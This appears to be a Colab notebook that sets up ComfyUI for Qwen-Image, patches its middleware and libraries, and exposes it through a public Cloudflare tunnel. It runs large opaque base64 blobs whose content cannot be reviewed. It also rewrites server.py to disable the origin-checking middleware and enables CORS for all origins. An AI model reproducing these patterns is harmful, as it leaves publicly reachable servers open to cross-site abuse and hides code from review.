M+G9qqgXVxCTqcJ7rVXnVBv/7r91NrVSr0SdwaGo7iieqS4V01KnUkig1PG471ffXXy5/8++eD1O999efLJLyizlx3McspV0lVN98EYfpLYxFWtIkMJ/Nu+aQeQ6IoM+9DKHkc4S+G/+fvpO+/e/e7D05+/d+evH5x+/ebpX547e/tFpvRLaHrlEhSNyl7lvHIA/3R+Eefzxw1ItK6qUWlGF+RYipEAK9e2tv4do+oyxbPptExNWXFNvUW+h7YjbKBc3USEAMXRJbk7B13gdZ9VBim5vAY5vz7TQOZqtfL03OwcPoJZ0EPRMrSsufvZ7+699RzgrSRTyTXbcjQoSpBkhoJqtbm52UqFEqjOlSuVRhqB4snv//f02c/OXv7byUu/Zt68V+Fmh2RlES5nph2ATH26XGVkGvXqTAaZ176++9vfhQRkTgISh9Mjyqrl+G0IFPgigwrgrZVrlEplulpu1NKp0ALizu3/BELLG9uonWlGCb/F3I6+ySJVnplmyqqVG41yZVJSmYTSydQrM/XZ0P5z0/UMMq+/Ch+MDA+F08pQ1Xf5yPPBCS9fBvLw9tJmdW95AqKVSr06OzlREBgqs1FyV6FeyqRXrTYaM7PMbPDTmE6ld++LX937+E0e77/9+YBqdVhUIMnj24rjQKLJDnC1an0GFhgjXZ2rVObOSzoSOI3oeLFhwU1X59iaqEzPVGZSaUOMvfPNL2Hpnb79M041XHpWYOrKmmEQzc9eefVqebYxw41Zn50tp1K5c/urkz++xIzJlnlIBZadR5LOmkmqXK/NcIHmpqfr6aTu3v7i9IM3zr5+6e4rzycFWnH0I+Uigf2alU2kWpstV6rcWebqs9V0ef76p9Ovf3v63ldnt7/jRMpyjUsUuL0jZZ1YXTQSDGcu8epsjVEqz8EyCCkN7Ud2sdQ5++Tbk1dvn738s2R9x8qgWLnDyptwn5DlGBAhZ1kYg89yJVwPpy9+zHyQZd+TN14FTnhRubOzo1xV7ZsKLwkw/u90HAiZyg5myJ0jW8v0kEqlWuceMg2eyMmdvf8RqPLsv768+/wnEJlPv/rbyYsvhxuWyzQwq5bpdXYsU0dNZsb+Sn1uhuGvlsv1chjDmAvce+uNk1ffYTaKI2d+cD/c9fIc/MfjI6zgEDcvuaDyvv3p3T+9AHTiuFm22ukSot+X+cZcrVzmtmjU58JYOFLenXz3BdgHKJ699lM0zgfvMm/zkIriMTIpqWs/l9Ms1fMEZcu5ig0EUQlceX139wr9Bmt7XbV1i7i8z6ITQ3D5G4X3CEWPWIYEw89IgtGVBM3RiSR0vJYktIkKhD1JsEk/cK1Yswbq7sC1hS3HJqz+cLpYQmJPCBhoBqal8yExZK2QyyF5hdc6OEs0fdLhWJWeqUuCYrDfNmDCl+yVkdJsivokAMz6QGn9MaNbEEADgxct4nvmjwl784QwXU6XiZINgKoRFXYa6wZBUdcpqV2zpDt9KJFUvdQBhVle6RZKcLyE/dANffEWSnL8qI8tGfjCmzfH+dG+Ykx9Mn5QE17ltlGCyAqLt/LXPOIWl1vE9vPzQv6y82PTstTStFzOHxckwTc7xAn8xUo10U4MPWLNdXlfl8SIQ5GHuiUyp8JaSpuOpqKX5xM9PARONtW4ykR8E7PEfRqZiZkBn5dTVNdUwaxYwe7naC/TsCW0gmkL8XbV/DmdIrX1iOZHEql+8aOEX4SMyWoXzKOLRv6WEhzfsGE5mS7YlhOlI6h/ML19DJrL9U2/TbvoIkZ0bIujGSvlArPCYaxrS5vxNg7KHbUrxheJJCQK/NgiNNlqSppEcVGjLl1B+Db5MkUUd7wsLhcGifHZjCCVjjpsvuR3uiWYqloWY1LRLdk/9DHc9eEXsSGowHZnMR/4RrGRZwpQjbiODbnvwooX8zfsPLcmJ1cQHhdwlBkUYqIMeVC8nsfXVQ1pFE38PY6LIoM7wN+sVioexp692HMRV3ARkPA1sGhDQGBvNAciL7y0nFbRIj1iLeIRR34fgmabaDcXL6mWR9CVKRcmbP+HeqsP3pSqKYBDcbDTlNJB4uvGczUFl47u+YrNlk/E0HyoRYQat4IokkjniGscNCWVHYcZORaLU9cjoxBz7pGjAJziHXUs074Z4pNCzgZhavwhADsAAAbz//b02pby9CVlBYoLyhFoKeqrcx1ByapYWcdTPOpTR2NRPdnHDyePNPKjNW8Z1DQwCwohnyZvrs+hNW4ZMixWDxecmE+afEhFVqqVBqwAquSZSVZ4tJLGGHs+M2KcLB8B4hLjsTCC5P6HN/EDnBVZuKL6WluAlEucNq3GvQDCR8kGswD5o3kB9/2C4aodoriqT9j5HdY8UP3ogu9A7EJCqiWI4blmtc48VNX16KxTdVteTum1PYWiVrpHqe6gBZ7vdBhMOFjcQ+7YXmGHcpfJbj71dC9ONXRKGyIacMAqhTgAHu6lxVoZz3ZFvpAdqMtAByhCPh/XbD7UDFQWt0Z0nzfxsNODdyJ92nY3VRRf4rVuAnagc4RPtaMBhZO/7cLGUEp9fyvP1Q8YGiAYhEd4qsAT7oXw8Xh0YkECmRJiKtX6P5Ok1XpCVMgH+FQulyeWG+r0h2zehEphxaSgDtdROmo10E0HMeeXr13c2M6nKrID+zWliSuaQu6t7ygr+O2yagM7bvqknkoY9PLaCMBxUif/PIz/oPwqS6VaW7VbEEQXBVrxDLI+jy6Y1jBOxeo7HrboJ0SkrqVqUGzzCVLkuZJQKcR2RhEdTJ1sa2HFCOH6Pi8tBbUxMbmQGDpQSImmiAsJI10ISwhG0+tapi9eiDnYhcL1yn403jZ1ndh0tLw/EeOASYpceRKu84NrKyGb88CgL2Flz34sx+kqmhPYPnuTn1iX3we5lMkSoAebZE6F12Upf38z8eEB76kpMnU7wrceVMgC1herYX0BCxo2/C6RDzxB9aFq6LLCH6oLPbCI4GlARRBx3e9uX1E21/bWNpUry7ur68oebMMp9QPvASqGPmmWDrxSjI/sUuEg3BwqB8NFwoE3SXmAfoPg7G7MJTTTVbDS03j05DP3OAgXQL70WLrUj5WigppCjyvpOZ/Yoghci20mw36Lq/blFpS8QTPwiMu1R7svTzke1JkqiHEzW3H0KC1Fe7E+STkUXtYJdr3EUCfn2U2Eeju/OhRWCHL/yI/BkDMCm3YdhUzriDZt25m24RR4NgOuxEdwWPjJTwT8lP0jcNZHFoEaUqIqw7NoE/a3Bd6RWaBTcaPr0zkXVV8F9jZBpU+6apc2SrZgfBdQiRHSwpIcAQOxAbRLWiaeZxCdOrqCwN71aN7+YF6csOcErkaArBi+XZLpdcAlOQypS3KstF9aEkYAw4InDghsQhhG8EG+52mSZsloEJIl5srBd/WQZ8xoCBNnAsbD41LfIp43LxiYFtmr47hg8Nsw8Zbi9fylze3lXfDGASeyLDPBpVHmxEfYKzncloCWh0YWwa6NgrAEggjzQy+HJOEv4RnxDMmVLgbr+KCnoeXnqQdxEZiY+0xOi/gcDqSkdmbfPLCDaeui2C8Ii08IfdkGo1Ce44m0kPACtUf0PRWvzqFbL4WYlJ5qBbHG1pIgLruueiSbHv0UEXoIGPWSMgzpV5hPexF3mojQvBDYoFBYLvrCYIWxiYWYIXFY7XYHkoe6KgzVmZGiYtARMF/RcfVI3IEknMB1RZUPZZFHspCP1rao+/kk5tGtfmRmeXlra3t3eXftYgoYVdc85wtrnNAdl5YSKyryaAjr8/T3sg1hEWjro0AdB0L+PPsYA4Y3wQKf7GDfFqT126DfsLF8nQ5IQrW8vyCkFLeaallNVbsp9gopCgqt6LdNj4ccT3ahJNGzoKkuQNmXMSlTSFHsCY8LW0GnSVx57crOxub2VkEoCWk4H0sZXUilczwZr7i0H30UOHpCGB4vUD6HRxcmxAtpjOL9kTA8nobXtNPxUijqOjClNwqTZjDqYaGnpTiWCdW1erTH/DFMmGKWvbibUE3vOldcopkewg84k5KydEMQ9OxaYSKe+dx5Ybt5QDRfhnrBbNnirWNpsGCSrbDjheH2HEvhYXQoJGIqPSpJzoi/lruB1xZ5fIpFi0SgiqIs1gVRfEMjJ97YgWWlh6/IjiH8SFyKhUkODFknOZnlrrHoq/U0EViqYMcZRN/QD4fSDpQDOjncNkbVwGbiZiNlFuaqDZyZlrAGG5T8CD6jeV5seNyA3xTwMMM8HEXpqy5gYWhDdp+ATRGktPArFAiMMB9nX+aFcgwZz0qRnigomDk+hpaOyA3bIyESbmVhJxibjLvShftOiLBLsKsTMnwz5jff0z3Huub3d8sMlzzOxV5GNR57WIi/4wEBQgik5eO0V/Kg/sLTZyzABoUV+4sb7lzsb2jCssqkfmWOLauowHRaolqJI1V1cFT4LibLDlatShtbtGLlLM/D02glAdo9LsTVglTTibL9yGIc+8IQBC9iqL5SiQ0meMRnW6FVqndGMwy0CY6opAB+0XT9o1XV7qmgRtF3aczHMxoGbJj+OsFrorQSg8HjHDsh2sW8kLkTw/1s1ruFXNhDS2x/DxLNFSwGw33T2iEe9WBiugWaj+0Y6ZFoNmS8QYT9Iw8PyxPdT/Qnl16O1MO0PbRUDcftqFynNHrFejST/MTne6sYLiXc49ikz8cKCzFdYG9rlEsWARUtcC91eAhMsDoust7IMw5ugP8nOUeXjOHESFgQRsRFywyAHhcqQ1h+aBpM9SZufSlU8Khr9PAU+EJKyh5sqblKU9sGt5IiQQCBOeQS5dw37RZFg3tGKS3VXUg6wMPlJTlxXF9geGYYJXAmmxg1HsLYPfGEeKNicRgo5CYGlIJZJ+Br5Pxzj5Nf+WIy3J0u0WK8PJzmStoaY6RS1cvfsX5MhkYHMIMuBybdsZC49VmkTY3xcCmJdiz8oPshLMbaH/dReVs17dVwrxkuBdhMOL7js0Xh2NhPW3UJbnIhdMe3LikMZTYAMQAVUkRIsoBQlCjLkoAnTpK3D9Oj1HjSvPeYwsDx8ODIwPcPGtkxr6dJYUwZjXktfyTTuATCN//LZZkc+q56/QKGmKcI6dILzPQvl31yYZ/3a/AGLqHc0ktzO+yZ7j/FG7RvMjwVElFS7nATSryhRPgD4Q+vqYgsalxXbHozs4uW2RccI9zTEtt3TeKJyJ8T+FhLQhl967iQ6kc0KlAcSzK9uaqwGpCm6+GIfiOPdT4D5+XuyEAiusa3CJluzKOgRTvjTFUt7FUvha3tlaMNCGwib92IKHhBKKBUmbAUZmEsPaOPfmox0RM9UZifWrxEgo0WMJGzZKoCCS7xjQptxaUtzLGhK9U5s9cbuKwUOW9ixQ2dQo09gTsIT+AuysJy4DtF1TJbNv65dej7nuDY2Oy5yS4gqpofQFI2QccQ4qASA1B6NUt4VFjd3LgSQucU3TQMRR93lwshAiyhFTaQzymaZXbHT/JhLSpUHuIOnc2ZHr3UxQgP3UPm7xj+8NiuXUPKtK1j0MVHb4h5jguZQUxcFOM4C7igsm+HsYO6Z/rEVui9jugkypBBk+DbHMJ2NP8ZNeut6ys68d3R1/sR1yjGJGxzcSdmu9azlEYzizLqOlQZVW7ISfxeqeYrHYl90uuOfML18r40mADfcvGgp/R19k8ojFgdzyJLvBgpRT5Jr5+GoH0j+tv+oSt0Kc7R11Ou2TEWDHvkfmAqdIgZJsRViv9qSFyXg2NIBExY+OQXL9x798sEwHxml1vpp1y87mNu6IeXrlNbvllXBwd4DRpZgG0Z79WLLG70u1kn14Xx6PAaMF6CRuUBGoPdbKfH7YDt+v595rOLtC2uDzaZphb6t5uIAnIcG/aCJs0KHO94MQe8YRbHS9hA5Zy8oQcrWjtx/2asHMyTKNUJuKN3LjwfUx9jDHM0uvj9dM7M2KP3RdjM5Kla/v7T0ZGRPkTca1tru5sO/lVCnrqp6dEob2PG6fckaljmwBZ1lF4Bd/IVFgr6PTzbCx2aL/r7y84lwLmLPHgsxNQdXTgZ98OuKHEhMAc9PCGGotvkUmgPJgX7RxjWVO9ovXZ+aWp0REy3Cf0rDHhTHRW0cB5JJfpZ4Z/Vgf2koSTw8DRB/1GK86ujOok6Kg9JHcNqeEDx61qtUjdqlSLRdLVYb5YbRZXMNYqGqjbVStOYqdSM8+hidqCL6UxdzDyQLqa5LmYeUBeoBQY9QQilWUwPOl3MPJIQS2Wp5S8O4cZaUT3NNNnfkeCGWod6YrGaHTUnuzWfuK/0fygh4CE=")).decode("utf-8"))
_cm_final = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists("/content/ComfyUI/middleware"):
    open(_cm_final, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
def _is_port_open(port=8188):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ok = (s.connect_ex(("127.0.0.1", port)) == 0)
    s.close()
    return ok

if _is_port_open(8188):
    try:
        req = urllib.request.Request("http://127.0.0.1:8188/api/free", data=b'{"unload_models": true, "free_memory": true}', headers={"Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
else:
    subprocess.Popen(["bash", "-c", "nohup python main.py --dont-print-server --enable-cors-header '*' > /content/comfyui.log 2>&1 &"], cwd="/content/ComfyUI", start_new_session=True)
    for _ in range(120):
        if _is_port_open(8188):
            break
        time.sleep(0.5)

try:
    urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8188/api/object_info", headers={"User-Agent": "Mozilla/5.0"}), timeout=35)
except Exception:
    pass

def _ensure_cf_tunnel():
    cf_url = ""
    if os.path.exists("/content/cf.log"):
        txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
        if m and subprocess.run(["pgrep", "-x", "cloudflared"], capture_output=True).returncode == 0:
            candidate = m.group(0)
            try:
                r = urllib.request.urlopen(urllib.request.Request(candidate + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=4)
                if r.status == 200:
                    return candidate
            except Exception:
                pass
    subprocess.run(["pkill", "-9", "-x", "cloudflared"], check=False)
    if not os.path.exists("/usr/bin/cloudflared") and not os.path.exists("/usr/local/bin/cloudflared"):
        subprocess.run("wget -q -nc https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && dpkg -i cloudflared-linux-amd64.deb", shell=True)
    print("🌐 正在建立 Cloudflare 专属隧道并等待全球 DNS/SSL 证书生效...")
    subprocess.Popen(
        ["bash", "-c", "nohup cloudflared tunnel --protocol http2 --ha-connections 4 --url http://127.0.0.1:8188 > /content/cf.log 2>&1 &"],
        start_new_session=True
    )
    for _ in range(50):
        time.sleep(0.5)
        if os.path.exists("/content/cf.log"):
            txt = open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read()
            m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", txt)
            if m and ("Registered tunnel connection" in txt or "Connection" in txt):
                cf_url = m.group(0)
                break
    if not cf_url and os.path.exists("/content/cf.log"):
        m = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", open("/content/cf.log", "r", encoding="utf-8", errors="ignore").read())
        if m:
            cf_url = m.group(0)
    if cf_url:
        for _ in range(25):
            try:
                r = urllib.request.urlopen(urllib.request.Request(cf_url + "/system_stats", headers={"User-Agent": "Mozilla/5.0"}), timeout=3)
                if r.status == 200:
                    break
            except Exception:
                time.sleep(0.8)
    return cf_url

cf_url = _ensure_cf_tunnel()
from IPython.display import clear_output
clear_output(wait=True)
print("="*65)
print("🎉 千问 Qwen-Image 2.1 挂载与启动全部完成！")
print(f"🌐 【首选直连 · Cloudflare 免403极速通道】：\n👉 {cf_url}")
print("="*65)
display(HTML(f"""
<div style="margin:12px 0;padding:16px;border-radius:10px;background:#1e293b;color:#fff;font-family:sans-serif;">
  <div style="font-size:16px;font-weight:bold;margin-bottom:12px;color:#a78bfa;">🎨 千问 Qwen-Image 2.1 模型与 12 套工作流已就绪！</div>
  <a href="{cf_url}" target="_blank" style="display:inline-block;padding:10px 22px;background:#8b5cf6;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;margin-right:12px;">🌐 点击打开 ComfyUI (Cloudflare 首选通道)</a>
</div>
"""))

In [ ]:
# @title 🚀 7. 单独重启 ComfyUI 网页（不重下模型 · 秒出免403双链接）
import os, subprocess

import time, socket, re, urllib.request, gzip, shutil, pathlib
from google.colab import output
from IPython.display import display, HTML
cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "_OBJ_INFO_CACHE" not in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "body": None, "ct": "application/json"}

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    cn = "/content/ComfyUI/custom_nodes"
    if os.path.isdir(cn):
        try:
            parts.append(",".join(sorted(os.listdir(cn))))
        except Exception:
            pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["body"] is not None:
            return web.Response(body=_OBJ_INFO_CACHE["body"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["body"] = bytes(resp.body)
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 2048
        and "Content-Encoding" not in response.headers
        and "gzip" in request.headers.get("Accept-Encoding", "")
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

os.chdir("/content/ComfyUI")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "return await handler(request) # patched" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
ONE_DAY: int = 86400
IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    response: web.Response = await handler(request)
    if request.path.startswith("/extensions/"):
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        return response
    if request.path.startswith("/assets/"):
        response.headers["Cache-Control"] = "public, max-age=604800, immutable"
        return response
    if request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFze